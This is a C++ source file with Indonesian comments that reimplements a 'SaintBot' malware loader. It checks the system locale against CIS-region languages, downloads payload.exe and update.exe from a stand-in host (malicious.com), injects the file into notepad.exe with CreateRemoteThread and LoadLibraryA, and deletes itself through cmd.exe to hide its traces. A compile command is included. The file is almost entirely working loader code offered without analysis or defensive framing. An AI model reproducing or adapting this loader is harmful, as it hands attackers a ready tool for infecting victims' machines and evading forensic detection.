// SaintBot payload Loader includes the following components:
//
// 1. Locale Check: Fungsi IsSupportedLocale memeriksa apakah locale sistem sesuai dengan daftar locale tertentu.
// 2. Downloading Payload: Fungsi DownloadPayload mengunduh file dari URL tertentu dan menyimpannya ke lokasi tertentu.
// 3. Injecting into a Process: Fungsi InjectIntoProcess menyuntikkan sebuah DLL ke dalam proses yang sedang berjalan berdasarkan nama proses.
// 4. Self-Deleting: Fungsi SelfDelete menghapus executable setelah eksekusi selesai.

// manual compile: x86_64-w64-mingw32-g++ -o SaintBot.exe SaintBot.cpp -lwininet

#include <windows.h>
#include <wininet.h>
#include <string>
#include <tlhelp32.h>

#pragma comment(lib, "wininet.lib")

typedef NTSTATUS(WINAPI *pNtQueryDefaultLocale)(BOOLEAN, PLCID);

// Fungsi untuk memeriksa apakah locale sistem sesuai dengan daftar yang didukung
BOOL IsSupportedLocale()
{
    // Memuat pustaka ntdll.dll untuk mengakses fungsi internal
    HMODULE hNtdll = LoadLibrary("ntdll.dll");
    if (!hNtdll) return FALSE;

    // Mendapatkan alamat fungsi NtQueryDefaultLocale
    pNtQueryDefaultLocale NtQueryDefaultLocale = (pNtQueryDefaultLocale)GetProcAddress(hNtdll, "NtQueryDefaultLocale");
    if (!NtQueryDefaultLocale) {
        FreeLibrary(hNtdll);
        return FALSE;
    }

    // Mendapatkan LCID (Locale ID) default dari sistem
    LCID DefaultLocaleId = 0;
    if (NtQueryDefaultLocale(FALSE, &DefaultLocaleId) >= 0)
    {
        FreeLibrary(hNtdll);
        return (DefaultLocaleId == 0x419 ||  // Russian (Russia)
                DefaultLocaleId == 0x422 ||  // Ukrainian (Ukraine)
                DefaultLocaleId == 0x423 ||  // Belarusian (Belarus)
                DefaultLocaleId == 0x42B ||  // Armenian (Armenia)
                DefaultLocaleId == 0x43F ||  // Kazakh (Kazakhstan)
                DefaultLocaleId == 0x818 ||  // Romanian (Moldova)
                DefaultLocaleId == 0x819);   // Russian (Moldova)
    }
    FreeLibrary(hNtdll);
    return FALSE;
}

// Fungsi untuk mengunduh payload dari URL dan menyimpannya di file lokal
BOOL DownloadPayload(const char* url, const char* filepath)
{
    // Membuka sesi Internet
    HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) return FALSE;

    // Membuka URL yang diberikan
    HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL)
    {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    BYTE buffer[4096]; // Buffer untuk menyimpan data yang diunduh
    DWORD bytesRead;   // Jumlah byte yang dibaca
    HANDLE hFile = CreateFile(filepath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Membaca data dari koneksi internet dan menyimpannya ke file
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead)
    {
        DWORD bytesWritten;
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }

    CloseHandle(hFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return TRUE;
}

// Fungsi untuk menyuntikkan DLL ke dalam proses tertentu
BOOL InjectIntoProcess(const char* processName, const char* dllPath)
{
    // Membuat snapshot dari semua proses yang sedang berjalan
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    // Mencari proses berdasarkan nama
    if (!Process32First(hSnapshot, &pe))
    {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    DWORD processId = 0;
    do
    {
        if (!_stricmp(pe.szExeFile, processName))
        {
            processId = pe.th32ProcessID; // Menyimpan ID proses
            break;
        }
    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);

    if (processId == 0) return FALSE;

    // Membuka proses yang ditemukan
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) return FALSE;

    // Mengalokasikan memori dalam proses target untuk path DLL
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteMemory == NULL)
    {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Menyalin path DLL ke memori proses target
    WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL);

    // Membuat thread di proses target untuk memuat DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMemory, 0, NULL);
    if (hThread == NULL)
    {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE); // Menunggu thread selesai

    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

// Fungsi untuk menghapus file executable dirinya sendiri
void SelfDelete()
{
    TCHAR szFileName[MAX_PATH]; // Menyimpan nama file executable
    TCHAR szCmd[MAX_PATH];      // Menyimpan perintah untuk menghapus file

    if (GetModuleFileName(NULL, szFileName, MAX_PATH))
    {
        // Membuat perintah CMD untuk menghapus file executable
        sprintf_s(szCmd, "cmd.exe /c del \"%s\" & exit", szFileName);
        STARTUPINFO si = { sizeof(STARTUPINFO) };
        PROCESS_INFORMATION pi;
        CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
}

int main()
{
    // Memeriksa locale sistem
    if (!IsSupportedLocale()) return 0;

    // URL dan path untuk payload
    const char* url = "http://malicious.com/payload.exe";
    const char* filepath = "C:\\Windows\\Temp\\payload.exe";

    // Mengunduh payload ke file lokal
    if (DownloadPayload(url, filepath))
    {
        // Menyuntikkan payload ke proses notepad.exe
        InjectIntoProcess("notepad.exe", filepath);

        // Mengunduh pembaruan untuk payload jika diperlukan
        DownloadPayload("http://malicious.com/update.exe", filepath);

        // Menghapus file executable sendiri untuk menghapus jejak
        SelfDelete();
    }

    return 0;
}
